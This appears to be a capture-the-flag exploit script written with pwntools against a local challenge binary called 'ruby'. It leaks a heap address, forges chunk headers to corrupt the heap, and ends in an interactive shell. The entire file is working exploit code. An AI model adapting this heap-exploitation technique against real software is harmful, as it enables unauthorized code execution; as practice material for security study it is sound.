from pwn import *

BEDUG = True

if BEDUG == True:
    io = process('./ruby')#, env={"LD_PRELOAD":"./libc.so.6"})
    raw_input("DEBUG")
else:
    io = remote()

io.sendlineafter(b' methods: ', b'2147483647')
def w(idx, dat):
    io.sendlineafter(b')> ', b'1')
    io.sendlineafter(b'Index: ', str(idx).encode('utf-8'))
    io.sendafter(b'Your data: ', dat)

def c(idx):
    io.sendlineafter(b')> ', b'2')
    io.sendlineafter(b'Index: ', str(idx).encode('utf-8'))

w(0, p64(0)*3+b'\x41\n')
w(1, p64(0)*3+b'\x41\n')
w(3, b'\n')
c(0)
heap = u64(io.recv(6)+b'\0\0') - 0x340
log.info('Heap: '+hex(heap))
cnt = 0
w(4, b'\n')
cnt+=1

for i in range(19, 26):
    w(i, str(i).encode('utf-8')+b'\n')
    cnt+=1

for i in range(27, 34):
    w(i, str(i).encode('utf-8')+b'\n')
    cnt+=1

for i in range(36, 42):
    w(i, str(i).encode('utf-8')+b'\n')
    cnt+=1

w(44, p64(heap+0x2e0)+b'\n')
w(195, b'\n')
w(45, p64(0)*3+p64(0x441)+b'\n')
w(1, b'\n')
w(0, p64(heap+0x340)+b'\n')
log.info("cnt: " +str(cnt))
w(0, b'\n')
w(1, b'\n')
w(1, b'\n')
io.interactive()
